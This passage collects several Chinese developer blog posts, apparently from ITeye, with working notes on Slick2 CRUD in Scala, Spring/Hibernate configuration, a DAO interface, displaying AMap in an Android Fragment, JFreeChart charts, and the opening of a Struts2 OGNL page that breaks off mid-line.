抓取的内容应该要适当格式化一下才可以用Jsoup做解析
不过试了下直接做解析也没什么问题(虽然有一些标签错误)
 
这只是个页面抓取的策略 其他的我不想多写了 大家自己实践一下 前提是你用自己的新浪微博的cookie进行抓取
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Slick2 使用笔记(2) CRUD, fair-jm.iteye.com.blog.2035666, Mon, 24 Mar 2014 19:29:49 +0800

本文来自:fair-jm.iteye.com 转截请注明出处
 
接着上一篇文
其实具体的都在slick官网的doc中:
http://slick.typesafe.com/doc/2.0.0/
 
这边就总结了一个CRUD 表结构接着使用笔记(1) 没什么变化(因为没设外键 所以就在单表操作):
Tables.Person来自于上一文 用slick的代码生成器生成
slick2有一套和scala的collection类似的操作(不同的是slick2操作的是Query Query可以通过list方法转变为scala中的List)
package slick_test
import org.junit.Test
import org.junit.Before
import scala.slick.jdbc.JdbcBackend.Database
import scala.slick.driver.MySQLDriver.simple._
class TestApp {
  var database: Database = null
  @Before def setUp: Unit = {
    database = Database.forURL(url = "jdbc:mysql://localhost:3306/test",
      user = "root",
      password = "",
      driver = "com.mysql.jdbc.Driver")
  }
  @Test def insert: Unit = {
    database withSession {
      implicit session =>
        //Tables.Person += new Tables.PersonRow(2, Some(23), Some("cc@test.com"), Some("cc"), Some("1111"))
        //Tables.Person insert Tables.PersonRow(0, Some(23), Some("cc@test.com"), Some("cc"), Some("1111"))
        //使用数据库的批量插入(如果数据库支持的话)
        Tables.Person ++= Seq(
          Tables.PersonRow(0, Some(22), Some("cc@test.com"), Some("cc1"), Some("1111")),
          Tables.PersonRow(0, Some(22), Some("cc@test.com"), Some("cc2"), Some("1111")),
          Tables.PersonRow(0, Some(22), Some("cc@test.com"), Some("cc3"), Some("1111")),
          Tables.PersonRow(0, Some(22), Some("cc@test.com"), Some("cc4"), Some("1111")),
          Tables.PersonRow(0, Some(22), Some("cc@test.com"), Some("cc5"), None))
    }
  }
  @Test def query: Unit = {
    database withSession {
      implicit session =>
        //使用 SELECT * FROM COFFEES 这边的*是在Person中定义的*方法反射得到的
        Tables.Person foreach {
          case Tables.PersonRow(id, age, email, name, phone) =>
            println(s"id:$id,age:$age,email:$email,name:$name,phone:$phone")
        }
        //使用for 
        val q1 = for (p <- Tables.Person) 
                   yield (p.email, p.age)
        q1 foreach println
        //输出年龄大于21的人名 用了get因为name属性是Option[String]
        Tables.Person filter {
          _.age>21
        } map {_.name.get} foreach println
    }
  }
  
  @Test def delete : Unit ={
    database withTransaction {
      implicit session =>
        //删除是先得到查询的Query再执行delete
        Tables.Person filter {
          _.id === 17
        } delete
    }
  }
  
  @Test def update : Unit ={
    database withSession {
      implicit session =>
      //操作依旧是在Query上的 和删除的思路是一样的
       val q1=Tables.Person.filter(_.id === 2)
       //更新所有的属性(注意id也会被更新..
       q1.update(Tables.PersonRow(2, Some(13), Some("test@test.com"), Some("fairjm"), Some("2222")))
       //得到查询语句
       println(q1.updateStatement)
       //得到查询的调用者
       println(q1.updateInvoker)
       
       //更新单个属性
       val q2=Tables.Person.filter(_.id === 2).map(_.name)
       q2.update(Some("cc"))
    }
  }
  
  @Test def aggregation : Unit ={
    database withSession {
      implicit session =>
        val ages=Tables.Person map(_.age)
        //得到的sum不会被立即执行 此外还有max min avg这些聚合函数
        val sum=ages.sum
        //输出sum
        Query(sum).foreach(println)
        //打印sum的语句:
        //select x2.x3 from (select sum(x4.x5) as x3 from (select x6.`age` as x5 from `person` x6) x4) x2
        println(sum.selectStatement)
    }
  }
  
  
}
 
还漏了分页 分页官网上有例子的 我就贴一下代码了:
http://slick.typesafe.com/doc/2.0.0/queries.html 写道
val q2 = coffees.drop(10).take(5)// compiles to SQL (simplified):// select "COF_NAME", "SUP_ID", "PRICE", "SALES", "TOTAL"// from "COFFEES"// limit 5 offset 10
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[存个档]SSH spring配置文件(XML), fair-jm.iteye.com.blog.2035253, Mon, 24 Mar 2014 00:08:48 +0800

本文来自:fair-jm.iteye.com 转截请注明出处
 
hibernate用的是4.2.6 spring是4.0.2
 
这回是XML的配置文件 我丢:
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:aop="http://www.springframework.org/schema/aop"
	xmlns:context="http://www.springframework.org/schema/context" xmlns:tx="http://www.springframework.org/schema/tx"
	xsi:schemaLocation="
					http://www.springframework.org/schema/beans 
					http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
					http://www.springframework.org/schema/aop 
					http://www.springframework.org/schema/aop/spring-aop-3.0.xsd
					http://www.springframework.org/schema/tx 
					http://www.springframework.org/schema/tx/spring-tx-3.0.xsd
					http://www.springframework.org/schema/context 
					http://www.springframework.org/schema/context/spring-context-3.0.xsd">
	<!-- 使用注解的方式 -->
	<context:component-scan base-package="com.cc.crm" />
	<context:annotation-config />
	<!--映入src下的jdbc.porpertise 文件 -->
	<context:property-placeholder location="classpath:jdbc.properties" />
	
	<bean id="sessionFactory"
		class="org.springframework.orm.hibernate4.LocalSessionFactoryBean">
		<property name="dataSource" ref="myDataSource" />
		<!-- 映入映射文件 -->
		<!-- <property name="mappingLocations"> <list> <value>classpath:com/products/*.hbm.xml</value> 
			</list> </property> -->
		<property name="packagesToScan">
			<list>
				<value>com.cc.crm.vo</value>
			</list>
		</property>
		<!-- 加入在外面写好的数据库中的注解 -->
		<property name="hibernateProperties" ref="hibernateProperties" />
	</bean>
	<!-- 配置数据源 -->
	<bean id="myDataSource" class="org.apache.commons.dbcp.BasicDataSource"
		destroy-method="close">
		<property name="driverClassName" value="${jdbc.driver}" />
		<property name="url" value="${jdbc.url}" />
		<property name="username" value="${jdbc.username}" />
		<property name="password" value="${jdbc.password}" />
	</bean>
	<!-- 数据库中的相关属性 -->
	<bean id="hibernateProperties"
		class="org.springframework.beans.factory.config.PropertiesFactoryBean">
		<property name="properties">
			<props>
				<prop key="hibernate.dialect">${hibernate.dialect}</prop>
				<prop key="hibernate.hbm2ddl.auto">${hibernate.hbm2ddl.auto}</prop>
				<prop key="hibernate.show_sql">${hibernate.show_sql}</prop>
				<prop key="hibernate.format_sql">${hibernate.format_sql}</prop>
			</props>
		</property>
	</bean>
	<!-- 事务配置 -->
	<bean id="transactionManager"
		class="org.springframework.orm.hibernate4.HibernateTransactionManager">
		<property name="sessionFactory" ref="sessionFactory" />
	</bean>
	<!-- 配置事务的传播特性 -->
	<tx:advice id="txAdvice" transaction-manager="transactionManager">
		<tx:attributes>
			<tx:method name="load*" propagation="REQUIRED" />
			<tx:method name="get*" propagation="REQUIRED" read-only="true"/>
			<tx:method name="save*" propagation="REQUIRED" />
			<tx:method name="update*" propagation="REQUIRED" />
			<tx:method name="delete*" propagation="REQUIRED" />
			<tx:method name="add" propagation="REQUIRED" />
			<tx:method name="*" read-only="true" />
		</tx:attributes>
	</tx:advice>
	<!-- 那些类的哪些方法参与事务 -->
	<aop:config>
		<aop:pointcut id="allServiceMethod"
			expression="execution(* com.cc.crm.service.impl.*.*(..))" />
		<aop:advisor pointcut-ref="allServiceMethod" advice-ref="txAdvice" />
	</aop:config>
</beans>
 还有一个配置文件:
jdbc.driver=com.mysql.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/crm
jdbc.username=root
jdbc.password=
hibernate.dialect=org.hibernate.dialect.MySQLDialect
hibernate.hbm2ddl.auto=update
hibernate.current_session_context_class=thread
hibernate.show_sql=true
hibernate.format_sql=true
 
 
JDK8用spring3.2.X会爆错 ClassReader的错 是ASM 要么hijack一下进行本地编译 要么换用spring 4.X 后者我试了下直接替换没什么大问题.
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[存个档]SSH BaseService, fair-jm.iteye.com.blog.2034729, Fri, 21 Mar 2014 20:08:36 +0800

本文来自 fair-jm.iteye.com 转截请注明出处  
 
单纯记录一下 以后方便直接拿来用 :
package com.cc.crm.service;
import java.util.List;
import java.util.Map;
import com.cc.crm.common.PageModel;
public interface BaseService<T> {
	
	/**
	 * 查询,不帶分页
	 * select * from user u where u.username=?
	 */
	public List<T> getList(String hql);
	public List<T> getList(String hql,Object[] values);
	
	/**
	 * 查询,带分页的
	 */
	public PageModel<T> getPageModel(String hql,int page,int limit);
	public PageModel<T> getPageModel(String hql,Object[] values,int page,int limit);
	
	/**
	 * 别名查询
	 * select * from user where id in (:id)
	 */
	public List<T> getList(String hql, Map<String, Object> alias);
	//既有别名又有?占位符
	public List<T> getList(String hql, Object[] values, Map<String,Object> alias);
	
	public PageModel<T> getPageModel(String hql,Map<String,Object> alias,int page ,int limit);
	public PageModel<T> getPageModel(String hql,Object[] values,Map<String,Object> alias,int page,int limit);
	
	/**
	 * 单个查询
	 */
	public T getObject(String hql);
	public T getObject(Class<T> clazz,int id);
	public T getObject(String hql,Object[] values);
	
	/**
	 * 插入
	 */
	public void add(T t);
	/**
	 * 修改
	 */
	public void update(T t);
	public void update(String hql);
	public void update(String hql,Object[] values);
	
	/**
	 * 删除
	 */
	public void delete(T t);
	public void delete(String hql);
	public void delete(String hql,Object[] values);
}
  原则:实现参数最全的方法 其他的重载方法直接调用参数最多的
 
PageModel:
package com.cc.crm.common;
import java.util.List;
public class PageModel<T> {
	private int total;
	private List<T> list;
	public int getTotal() {
		return total;
	}
	public void setTotal(int total) {
		this.total = total;
	}
	public List<T> getList() {
		return list;
	}
	public void setList(List<T> list) {
		this.list = list;
	}
}
 
实现就不放了 针对SSH 当然用了spring JPA之类的这些也就不用写了...
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Slick2 使用笔记(1), fair-jm.iteye.com.blog.2032631, Tue, 18 Mar 2014 02:07:34 +0800

本文来自 http://fair-jm.iteye.com 转截请注明出处
 
slick是什么具体就不多说了 官网都有介绍 自己跟着文档学学就记记笔记 方便以后复习了~~
 
这边从sbt开始 到eclipse
 
先在目录中建立sbt项目的基本结构(也可以用sbt的插件)
手动的话 基本目录应该是这样的:
 
 build.sbt  lib  project      build.properties      build.scala   plugin.sbt   project  src     main        java        resources        scala      test        java        resources        scala  target  
以上是完整的目录
当然也可以使用插件(比如sbteclipse-plugin) 全局插件的配置只需在你当前用户家目录(win下也一样)的.sbt的0.13(具体版本) 如果没有plugins文件夹就新建一个 然后放入plugin.sbt 里面填写插件 例如:
addSbtPlugin("com.typesafe.sbteclipse" % "sbteclipse-plugin" % "2.4.0")
 就可以使用了(在sbt中运行eclipse 或eclipse with-source=true 可以将sbt项目转化为eclipse也可以使用的项目)
项目结构如下:
 
在build,sbt中添加依赖 内容如下:
name := "sclick_test"
version := "1.0-SNAPSHOT"
scalacOptions ++= Seq("-unchecked", "-deprecation")
libraryDependencies ++= Seq(
	"mysql" % "mysql-connector-java" % "5.1.28",
	"com.typesafe.slick" %% "slick" % "2.0.0",
 	"org.slf4j" % "slf4j-nop" % "1.6.4"
)    
 这边使用mysql 就把mysql的包先导入 然后是slick的包和slf4j
 
 
然后是先得到实体 如果是已经有数据库了 那么直接用他的代码生成工具就可以了 格式如下:
来自 <http://slick.typesafe.com/doc/2.0.0/code-generation.html> 写道
scala.slick.model.codegen.SourceCodeGenerator.main( Array(slickDriver, jdbcDriver, url, outputFolder, pkg))
 这边给出我用mysql的代码:
package slick_test
object model {
	def main(args:Array[String])={
	  scala.slick.model.codegen.SourceCodeGenerator.main(
	  Array[String]("scala.slick.driver.MySQLDriver", 
	                "com.mysql.jdbc.Driver", 
	                "jdbc:mysql://localhost:3306/test", 
	                "G:/scala_workspace/slick_test/src/main/scala",
	                "slick_test")    
	  )
	}
}
会生成一个Tables的scala代码文件 可以直接使用
使用如下: 这里只做一个insert的代码(因为其他我还没看 没学嘛 QAQ)
 
  def main(args:Array[String]):Unit={
     Database.forURL(url="jdbc:mysql://localhost:3306/test",
                     user="root",
                     password="",
                     driver="com.mysql.jdbc.Driver") withSession {
       implicit session =>
          
          Tables.Person += new Tables.PersonRow(2,Some(23),Some("cc@test.com"),Some("cc"),Some("1111"))
     }
  }
  用Some是因为数据库中的属性是nullable的 ID如果是自动增长的 那么随便写(因为最后的语句中是不会insert id的 交给数据库自己处理) +=和insert方法一样
 
 
然后自己写实体也是可以的 但是挺麻烦的 还是用工具生成下比较方便
  class Persons(tag: Tag) extends Table[(Int, Option[Int], Option[String], Option[String], Option[String])](tag, "person") {
     val id: Column[Int] = column[Int]("id", O.AutoInc, O.PrimaryKey)
    /** Database column age  */
    val age: Column[Option[Int]] = column[Option[Int]]("age")
    /** Database column email  */
    val email: Column[Option[String]] = column[Option[String]]("email")
    /** Database column name  */
    val name: Column[Option[String]] = column[Option[String]]("name")
    /** Database column phone  */
    val phone: Column[Option[String]] = column[Option[String]]("phone")
  // Every table needs a * projection with the same type as the table's type parameter
    def * = (id, age, email, name, phone)
}
  val persons = TableQuery[Persons]
 这边没有用PersonRow(工具会自动生成的) 直接用tuple就好了
 进行插入操作和以上是一样的:
 persons insert (2,Some(21),Some("cc@test.com"),Some("cc"),Some("1111"))
 
 
最后注意一点 关于导包 进行+=操作需要导入相应数据库的slick的驱动包
笔者最开始用scala.slick.driver.JdbcDriver包爆出一堆异常(用代码生成器时Int/Integer找不到 手写时提示SQL语法有错误) 用什么数据库就导入相应slick的驱动包 切记
 
完整代码:
package slick_test
//import scala.slick.jdbc.{GetResult, StaticQuery => Q}
import scala.slick.jdbc.JdbcBackend.Database
//import Q.interpolation
import scala.slick.driver.MySQLDriver.simple._
object jdbc {
  def main(args:Array[String]):Unit={
     Database.forURL(url="jdbc:mysql://localhost:3306/test",
                     user="root",
                     password="",
                     driver="com.mysql.jdbc.Driver") withSession {
       implicit session =>
          persons insert (2,Some(21),Some("cc@test.com"),Some("cc"),Some("1111"))
          
          Tables.Person += new Tables.PersonRow(2,Some(23),Some("cc@test.com"),Some("cc"),Some("1111"))
     }
  }
  
  class Persons(tag: Tag) extends Table[(Int, Option[Int], Option[String], Option[String], Option[String])](tag, "person") {
     val id: Column[Int] = column[Int]("id", O.AutoInc, O.PrimaryKey)
    /** Database column age  */
    val age: Column[Option[Int]] = column[Option[Int]]("age")
    /** Database column email  */
    val email: Column[Option[String]] = column[Option[String]]("email")
    /** Database column name  */
    val name: Column[Option[String]] = column[Option[String]]("name")
    /** Database column phone  */
    val phone: Column[Option[String]] = column[Option[String]]("phone")
  // Every table needs a * projection with the same type as the table's type parameter
    def * = (id, age, email, name, phone)
}
  val persons = TableQuery[Persons]
}
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
设置高德地图在Fragment中显示, fair-jm.iteye.com.blog.2029597, Tue, 11 Mar 2014 17:46:38 +0800

本文来自:fair-jm.iteye.com 转截请注明出处
 
官网的教程是在Activity下 在Fragment下在高德论坛找到一些方法 试了下可以显示 但是切换后总会有些问题
比如切换后就是新的了 切换后地图就不显示了
我这种方式可以在切换后保持地图状态 但是得限定屏幕为水平或者竖直 如果翻转的话也会报错
 
布局文件:
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >
    <com.amap.api.maps.MapView
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/mapView"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >
    </com.amap.api.maps.MapView>
</RelativeLayout>
 
代码：
package com.cc.android.map.fragment;
import android.app.Activity;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import com.amap.api.maps.AMap;
import com.amap.api.maps.MapView;
import com.cc.android.map.MainActivity;
import com.cc.android.map.R;
import com.cc.android.map.constant.Constants;
public class MapFragment extends Fragment {
	
	private static MapFragment fragment=null;
	public static final int POSITION=0;
	
	private MapView mapView;
	private AMap aMap;
	private View mapLayout;
	
	public static Fragment newInstance(){
		if(fragment==null){
			synchronized(MapFragment.class){
				if(fragment==null){
					fragment=new MapFragment();
				}
			}
		}
		return fragment;
	}
    @Override
	public View onCreateView(LayoutInflater inflater, ViewGroup container,
			Bundle savedInstanceState) {
    	if (mapLayout == null) {
			Log.i("sys", "MF onCreateView() null");
			mapLayout = inflater.inflate(R.layout.map, null);
			mapView = (MapView) mapLayout.findViewById(R.id.mapView);
			mapView.onCreate(savedInstanceState);
			if (aMap == null) {
				aMap = mapView.getMap();
			}
    	}else {
			if (mapLayout.getParent() != null) {
				((ViewGroup) mapLayout.getParent()).removeView(mapLayout);
			}
		}
		return mapLayout;
	}
    @Override
    public void onAttach(Activity activity) {
        super.onAttach(activity);
        ((MainActivity) activity).onSectionAttached(Constants.MAP_FRAGMENT);
    }
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
	}
	@Override
	public void onResume() {
		Log.i("sys", "mf onResume");
		super.onResume();
		mapView.onResume();
	}
	/**
	 * 方法必须重写
	 * map的生命周期方法
	 */
	@Override
	public void onPause() {
		Log.i("sys", "mf onPause");
		super.onPause();
		mapView.onPause();
	}
	/**
	 * 方法必须重写
	 * map的生命周期方法
	 */
	@Override
	public void onSaveInstanceState(Bundle outState) {
		Log.i("sys", "mf onSaveInstanceState");
		super.onSaveInstanceState(outState);
		mapView.onSaveInstanceState(outState);
	}
	/**
	 * 方法必须重写
	 * map的生命周期方法
	 */
	@Override
	public void onDestroy() {
		Log.i("sys", "mf onDestroy");
		super.onDestroy();
		mapView.onDestroy();
	}
}
 这样可以保证在切换fragment的时候 地图不会不显示或者还原
注意要在清单中注明app的方向 不能让屏幕翻转
在Activity标签中写:
android:screenOrientation="portrait"
 
以上的代码出了点问题 就是不要返回一个单例 不然关掉再打开不会加载地图 改正:
	public static Fragment getNewInstance(Context context) {
		MapFragment fragment = null;
		fragment = new MapFragment();
		fragment.context=context; //context变为域
		fragment.locationSource = new MyLocationSource(context);
		return fragment;
	}
  
 
不知道大家有什么方法 让高德地图显示在fragment中 在切换后依然保留原来的状态 翻转屏也不会有异常 欢迎讨论
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JFreeChart简单小例子, zz563143188.iteye.com.blog.1933112, Thu, 29 Aug 2013 08:59:46 +0800

 http://binfenghu.blog.163.com/blog/static/202820029201272124149479/
1.在D盘建一个temp文件夹，作为图标生成的位置
2.将以下代码复制到程序中运行
 
企业级项目开发流程详解：http://zz563143188.iteye.com/blog/1825168
收集五年的开发资料及源码下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
项目源码请下载codeFactory20130321,lib20130321LI两个文件,
 
 
import java.awt.Font;
import java.awt.RenderingHints;
import java.io.File;
import java.io.IOException;
 
import org.jfree.chart.ChartColor;
import org.jfree.chart.ChartFactory;
import org.jfree.chart.ChartUtilities;
import org.jfree.chart.JFreeChart;
import org.jfree.chart.StandardChartTheme;
import org.jfree.chart.plot.CategoryPlot;
import org.jfree.chart.plot.PiePlot3D;
import org.jfree.chart.plot.Plot;
import org.jfree.chart.plot.PlotOrientation;
import org.jfree.data.category.DefaultCategoryDataset;
import org.jfree.data.general.DefaultPieDataset;
import org.jfree.util.Rotation;
 
public class CreateChart {
 
       public static void main(String[] args) {
            CreateChart cc = new CreateChart();
            cc.setChartTheme();
            cc.createPieChart();
            cc.createPieChart3D();
            cc.createColumnChart();
            cc.createColumnChart3D();
            cc.createLineChart();
            cc.createLineChart3D();
      }
 
       /**
       * 防止中文乱码，设置图表主题的默认实现
       *
       * @return
       */
       @SuppressWarnings ("serial" )
       public void setChartTheme() {
            StandardChartTheme theme = new StandardChartTheme("CN" ) {
                   // 重写apply(...)方法借机消除文字锯齿.VALUE_TEXT_ANTIALIAS_OFF
                   public void apply(JFreeChart chart) {
                        chart.getRenderingHints().put(
                                    RenderingHints. KEY_TEXT_ANTIALIASING ,
                                    RenderingHints. VALUE_TEXT_ANTIALIAS_OFF );
                         super .apply(chart);
                  }
            };
             // 标题乱码解决
            theme.setExtraLargeFont( new Font("宋体" , Font. PLAIN, 20));
             // 图例乱码解决
            theme.setRegularFont( new Font("宋体" , Font. PLAIN, 12));
            theme.setLargeFont( new Font("宋体" , Font. PLAIN, 14));
            theme.setSmallFont( new Font("宋体" , Font. PLAIN, 10));
            theme.setBaselinePaint(java.awt.Color. white );
             // 应用主题样式
            ChartFactory. setChartTheme(theme);
      }
 
       /**
       * 饼状图
       */
       public void createPieChart() {
            DefaultPieDataset dataset = new DefaultPieDataset();
            dataset.setValue( "苹果" , 250);
            dataset.setValue( "桔子" , 350);
            dataset.setValue( "梨子" , 200);
            dataset.setValue( "香蕉" , 50);
            dataset.setValue( "荔枝" , 150);
            JFreeChart chart = ChartFactory. createPieChart( "水果产量比率图" , dataset,
                         true , true , true);
 
            Plot cp = chart.getPlot();
            cp.setBackgroundPaint(ChartColor. WHITE ); // 背景色设置
 
             // ChartFrame frame = new ChartFrame("水果产量比率图 ", chart, true);
             // frame.pack();
             // frame.setVisible(true);
 
             try {
                  ChartUtilities. saveChartAsPNG( new File("D:/temp/PieChart.png" ),
                              chart, 800, 500);
            } catch (IOException e) {
                  e.printStackTrace();
            }
      }
 
       /**
       * 3D饼状图
       */
       public void createPieChart3D() {
            DefaultPieDataset dataset = new DefaultPieDataset();
            dataset.setValue( "苹果" , 250);
            dataset.setValue( "桔子" , 350);
            dataset.setValue( "梨子" , 200);
            dataset.setValue( "香蕉" , 50);
            dataset.setValue( "荔枝" , 150);
            JFreeChart chart = ChartFactory. createPieChart3D( "水果产量比率图" , dataset,
                         true , true , true);
            PiePlot3D plot = (PiePlot3D) chart.getPlot();
             // 设置开始角度
            plot.setStartAngle(150D);
             // 设置方向为"顺时针方向"
            plot.setDirection(Rotation. CLOCKWISE );
             // 设置透明度，0.5F为半透明，1为不透明，0为全透明
            plot.setForegroundAlpha(0.5F);
             // 没有数据的时候显示的内容
            plot.setNoDataMessage( "无数据显示" );
             // 背景色设置
            plot.setBackgroundPaint(ChartColor. WHITE );
             // ChartFrame frame = new ChartFrame("水果产量比率图 ", chart, true);
             // frame.pack();
             // frame.setVisible(true);
 
             try {
                  ChartUtilities. saveChartAsPNG( new File("D:/temp/PieChart3D.png" ),
                              chart, 800, 500);
            } catch (IOException e) {
                  e.printStackTrace();
            }
      }
 
       /**
       * 柱状图
       */
       public void createColumnChart() {
            DefaultCategoryDataset dataset = new DefaultCategoryDataset();
            dataset.addValue(100, "北京" , "苹果" );
            dataset.addValue(100, "上海" , "苹果" );
            dataset.addValue(100, "广州" , "苹果" );
            dataset.addValue(200, "北京" , "梨子" );
            dataset.addValue(200, "上海" , "梨子" );
            dataset.addValue(200, "广州" , "梨子" );
            dataset.addValue(300, "北京" , "葡萄" );
            dataset.addValue(300, "上海" , "葡萄" );
            dataset.addValue(300, "广州" , "葡萄" );
            dataset.addValue(400, "北京" , "香蕉" );
            dataset.addValue(400, "上海" , "香蕉" );
            dataset.addValue(400, "广州" , "香蕉" );
            dataset.addValue(500, "北京" , "荔枝" );
            dataset.addValue(500, "上海" , "荔枝" );
            dataset.addValue(500, "广州" , "荔枝" );
 
            JFreeChart chart = ChartFactory. createBarChart( "水果产量图", "水量" , "产量" ,
                        dataset, PlotOrientation. VERTICAL , true , true, true );
 
            CategoryPlot cp = chart.getCategoryPlot();
            cp.setBackgroundPaint(ChartColor. WHITE ); // 背景色设置
            cp.setRangeGridlinePaint(ChartColor. GRAY ); // 网格线色设置
 
             // ChartFrame frame=new ChartFrame ("水果产量图 ",chart,true);
             // frame.pack();
             // frame.setVisible(true);
 
             try {
                  ChartUtilities. saveChartAsPNG( new File("D:/temp/ColumnChart.png" ),
                              chart, 800, 500);
            } catch (IOException e) {
                  e.printStackTrace();
            }
      }
 
       /**
       * 3D柱状图
       */
       public void createColumnChart3D() {
            DefaultCategoryDataset dataset = new DefaultCategoryDataset();
            dataset.addValue(100, "北京" , "苹果" );
            dataset.addValue(100, "上海" , "苹果" );
            dataset.addValue(100, "广州" , "苹果" );
            dataset.addValue(200, "北京" , "梨子" );
            dataset.addValue(200, "上海" , "梨子" );
            dataset.addValue(200, "广州" , "梨子" );
            dataset.addValue(300, "北京" , "葡萄" );
            dataset.addValue(300, "上海" , "葡萄" );
            dataset.addValue(300, "广州" , "葡萄" );
            dataset.addValue(400, "北京" , "香蕉" );
            dataset.addValue(400, "上海" , "香蕉" );
            dataset.addValue(400, "广州" , "香蕉" );
            dataset.addValue(500, "北京" , "荔枝" );
            dataset.addValue(500, "上海" , "荔枝" );
            dataset.addValue(500, "广州" , "荔枝" );
            JFreeChart chart = ChartFactory. createBarChart3D( "水果产量图", "水果" , "产量" ,
                        dataset, PlotOrientation. VERTICAL , true , true, true );
 
            CategoryPlot cp = chart.getCategoryPlot();
            cp.setBackgroundPaint(ChartColor. WHITE ); // 背景色设置
            cp.setRangeGridlinePaint(ChartColor. GRAY ); // 网格线色设置
 
             // ChartFrame frame=new ChartFrame ("水果产量图 ",chart,true);
             // frame.pack();
             // frame.setVisible(true);
 
             try {
                  ChartUtilities. saveChartAsPNG(
                               new File("D:/temp/ColumnChart3D.png" ), chart, 800, 500);
            } catch (IOException e) {
                  e.printStackTrace();
            }
      }
 
       /**
       * 线状图
       */
       public void createLineChart() {
            DefaultCategoryDataset dataset = new DefaultCategoryDataset();
            dataset.addValue(100, "北京" , "苹果" );
            dataset.addValue(200, "上海" , "苹果" );
            dataset.addValue(300, "广州" , "苹果" );
            dataset.addValue(400, "北京" , "梨子" );
            dataset.addValue(500, "上海" , "梨子" );
            dataset.addValue(600, "广州" , "梨子" );
            dataset.addValue(700, "北京" , "葡萄" );
            dataset.addValue(800, "上海" , "葡萄" );
            dataset.addValue(900, "广州" , "葡萄" );
            dataset.addValue(800, "北京" , "香蕉" );
            dataset.addValue(700, "上海" , "香蕉" );
            dataset.addValue(600, "广州" , "香蕉" );
            dataset.addValue(500, "北京" , "荔枝" );
            dataset.addValue(400, "上海" , "荔枝" );
            dataset.addValue(300, "广州" , "荔枝" );
            JFreeChart chart = ChartFactory. createLineChart( "水果产量图 ", "水果", "产量" ,
                        dataset, PlotOrientation. VERTICAL , true , true, true );
 
            CategoryPlot cp = chart.getCategoryPlot();
            cp.setBackgroundPaint(ChartColor. WHITE ); // 背景色设置
            cp.setRangeGridlinePaint(ChartColor. GRAY ); // 网格线色设置
 
             // ChartFrame frame=new ChartFrame ("水果产量图 ",chart,true);
             // frame.pack();
             // frame.setVisible(true);
 
             try {
                  ChartUtilities. saveChartAsPNG( new File("D:/temp/LineChart.png" ),
                              chart, 800, 500);
            } catch (IOException e) {
                  e.printStackTrace();
            }
      }
 
       /**
       * 3D线状图
       */
       public void createLineChart3D() {
            DefaultCategoryDataset dataset = new DefaultCategoryDataset();
            dataset.addValue(300, "北京" , "苹果" );
            dataset.addValue(100, "上海" , "苹果" );
            dataset.addValue(900, "广州" , "苹果" );
            dataset.addValue(200, "北京" , "梨子" );
            dataset.addValue(200, "上海" , "梨子" );
            dataset.addValue(700, "广州" , "梨子" );
            dataset.addValue(300, "北京" , "葡萄" );
            dataset.addValue(300, "上海" , "葡萄" );
            dataset.addValue(300, "广州" , "葡萄" );
            dataset.addValue(400, "北京" , "香蕉" );
            dataset.addValue(800, "上海" , "香蕉" );
            dataset.addValue(400, "广州" , "香蕉" );
            dataset.addValue(100, "北京" , "荔枝" );
            dataset.addValue(500, "上海" , "荔枝" );
            dataset.addValue(500, "广州" , "荔枝" );
            JFreeChart chart = ChartFactory. createLineChart3D( "水果产量图 " , "水果" , "产量" ,
                        dataset, PlotOrientation. VERTICAL , true , true, true );
 
            CategoryPlot cp = chart.getCategoryPlot();
            cp.setBackgroundPaint(ChartColor. WHITE ); // 背景色设置
            cp.setRangeGridlinePaint(ChartColor. GRAY ); // 网格线色设置
 
             // ChartFrame frame=new ChartFrame ("水果产量图 ",chart,true);
             // frame.pack();
             // frame.setVisible(true);
 
             try {
                  ChartUtilities. saveChartAsPNG( new File("D:/temp/LineChart3D.png" ),
                              chart, 800, 500);
            } catch (IOException e) {
                  e.printStackTrace();
            }
      }
}
 
3.代码生成的图表示例
 
 
 
 
 
 
 
 
 
 
 
 
    本文附件下载:
    
      源码.rar (1.7 KB)
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
OGNL 表达式详解（Struts2.1 ）, zz563143188.iteye.com.blog.1930939, Tue, 27 Aug 2013 08:33:36 +0800

Struts2.1 OGNL 表达式 学习笔记
 
Java代码 
 
<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>  
<%@page import="com.rao.struts2.bean.Sex"%>  
<%@ taglib prefix="s" uri="/struts-tags"%>  
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">  
<html>  
    <head>  
        <title>My JSP 'OGNL1.jsp' starting page</title>  
  
        <meta http-equiv="pragma" content="no-cache">  
        <meta http-equiv="cache-control" content="no-cache">  
        <meta http-equiv="expires" content="0">  
        <meta http-equiv="keywords" content="keyword1,keyword2,keyword3">  
        <meta http-equiv="description" content="This is my page">  
        <!--  
    <link rel="stylesheet" type="text/css" href="styles.css">  
    -->  
  
    </head>  
  
    <body>  
        <%  
            request.setAttribute("req", "request scope");  
            request.getSession().setAttribute("sess", "session scope");  
            request.getSession().getServletContext().setAttribute("app",  
